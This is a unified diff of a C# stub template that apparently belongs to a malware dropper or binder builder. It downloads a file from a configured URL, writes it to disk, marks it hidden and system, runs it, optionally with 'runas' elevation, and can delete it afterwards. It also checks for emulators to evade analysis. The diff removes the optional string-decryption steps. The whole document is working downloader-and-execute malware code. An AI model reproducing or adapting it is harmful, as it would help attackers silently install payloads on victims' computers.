@@ -127,10 +127,6 @@ class __Program__
 					if (url.__C2_AntiEmulator__ && isEmulator) continue;
 #endif
 
-					string address = url.__C2_Url__;
-#if ENABLE_STRINGENCRYPTION
-					address = __F_DecryptString__(address);
-#endif
 					__F_Drop__
 					(
 						url.__C2_FileName__,
@@ -139,19 +135,13 @@ class __Program__
 						url.__C2_DropAction__,
 						url.__C2_Runas__,
 						url.__C2_CommandLine__,
-						new WebClient().DownloadData(address)
+						new WebClient().DownloadData(url.__C2_Url__)
 					);
 				}
 				else if (item is __MessageBoxItem__)
 				{
 					__MessageBoxItem__ messageBox = (__MessageBoxItem__)item;
-					string title = messageBox.__C3_Title__;
-					string text = messageBox.__C3_Text__;
-#if ENABLE_STRINGENCRYPTION
-					title = __F_DecryptString__(title);
-					text = __F_DecryptString__(text);
-#endif
-					MessageBox.Show(text, title, messageBox.__C3_Buttons__, messageBox.__C3_Icon__);
+					MessageBox.Show(messageBox.__C3_Text__, messageBox.__C3_Title__, messageBox.__C3_Buttons__, messageBox.__C3_Icon__);
 				}
 			}
 			catch { }
@@ -199,21 +189,15 @@ class __Program__
 				return;
 		}
 
-		string path = __f1_name__;
-		string commandLine = __f1_commandLine__;
-#if ENABLE_STRINGENCRYPTION
-		path = __F_DecryptString__(path);
-		commandLine = __F_DecryptString__(commandLine);
-#endif
-		path = Path.Combine(dropLocation, path);
+		__f1_name__ = Path.Combine(dropLocation, __f1_name__);
 
-		File.Delete(path);
-		File.WriteAllBytes(path, __f1_data__);
-		if (__f1_hidden__) new FileInfo(path).Attributes |= (FileAttributes)6;
+		File.Delete(__f1_name__);
+		File.WriteAllBytes(__f1_name__, __f1_data__);
+		if (__f1_hidden__) new FileInfo(__f1_name__).Attributes |= (FileAttributes)6;
 
 		if (__f1_dropAction__ >= 1)
 		{
-			ProcessStartInfo processStartInfo = new ProcessStartInfo(path, commandLine);
+			ProcessStartInfo processStartInfo = new ProcessStartInfo(__f1_name__, __f1_commandLine__);
 			if (__f1_runas__) processStartInfo.Verb = /**/"runas";
 
 			Process process = null;
@@ -226,7 +210,7 @@ class __Program__
 			if (__f1_dropAction__ >= 2)
 			{
 				if (process != null) process.WaitForExit();
-				if (__f1_dropAction__ >= 3) File.Delete(path);
+				if (__f1_dropAction__ >= 3) File.Delete(__f1_name__);
 			}
 		}
 	}
